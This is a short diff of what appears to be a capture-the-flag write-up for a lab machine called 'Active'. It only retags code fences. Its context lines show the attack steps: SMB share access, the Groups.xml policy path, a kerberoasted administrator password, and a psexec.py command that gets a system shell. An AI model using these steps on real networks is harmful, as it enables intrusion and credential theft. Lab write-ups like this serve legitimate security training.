@@ -42,7 +42,7 @@ smbclient //10.10.10.100/Replication
 
 Once we gain access to the share, we can locate a file named Groups.xml within the directory path 
 
-```bash
+```
 **\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\**
 ```
 
@@ -154,7 +154,7 @@ And we got the administrator password : **Ticketmaster1968**
 
 As we already have admin creds through kerberoasting, we can get the system shell using psexec.py
 
-```bash
+```powershell
 psexec.py active.htb/administrator@10.10.10.100
 Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 
